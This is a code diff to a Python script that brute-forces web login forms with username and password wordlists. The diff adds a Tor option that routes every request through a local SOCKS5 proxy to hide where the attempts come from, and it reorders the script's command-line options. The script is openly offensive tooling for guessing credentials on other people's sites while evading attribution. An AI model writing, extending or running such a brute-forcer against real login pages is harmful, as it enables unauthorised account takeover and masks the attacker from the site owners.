@@ -4,6 +4,8 @@ import queue
 from html.parser import HTMLParser
 import requests
 import argparse
+import socks
+import socket
 from argparse import RawTextHelpFormatter # for newline in description
 
 ### refer to README.md for usage and explanations
@@ -86,10 +88,10 @@ class Bruter(object):
 			response = requests.get(target_url)
 
 			with requests.Session() as session:
+				print("Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))
 				response = session.get(target_url)
 
 				page = response.text
-				print("Trying: %s : %s (%d left)" % (self.username, brute, self.password_q.qsize()))
 				# parse out the hidden fields
 				parser = BruteParser()
 				parser.feed(page)
@@ -119,19 +121,24 @@ if __name__ == '__main__':
 	./BruteForceForm.py <login_page_url> -u username_file.txt -w passwords.txt --username-field user -e "password didn\'t match"\n\
 	./BruteForceForm.py <login_page_url> -u username_file.txt -w passwords.txt --post <post_url> -e "password didn\'t match"\n', formatter_class=RawTextHelpFormatter, prog="./BruteForceForm.py")
 	parser.add_argument("target_url", help="url of target")
-	parser.add_argument("--post", metavar="post url", help="url to post form (defaults to target_url)")
 	parser.add_argument("-u", "--usernames", help="file with usernames", required=True)
 	parser.add_argument("-w", "--wordlist", help="file with passwords", required=True)
-	parser.add_argument("-o", "--output", help="file where found matches will be stored")
 	parser.add_argument("-e", "--error-check", help="error check that should be not be present in response body upon success and present upon fail", required=True)
+	parser.add_argument("-o", "--output", help="file where found matches will be stored")
+	parser.add_argument("--post", metavar="post url", help="url to post form (defaults to target_url)")
 	parser.add_argument("--username-field", help="name of username input field")
 	parser.add_argument("--password-field", help="name of password input field")
+	parser.add_argument("--tor", action="store_true", help="proxy the requests through tor")
 	
 	args = parser.parse_args()
 	username_file = args.usernames
 	wordlist_file = args.wordlist
 	target_url = args.target_url
 	error_check = args.error_check
+
+	if args.tor:
+		socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+		socket.socket = socks.socksocket
 
 	if args.post:
 		target_post = args.post_tags
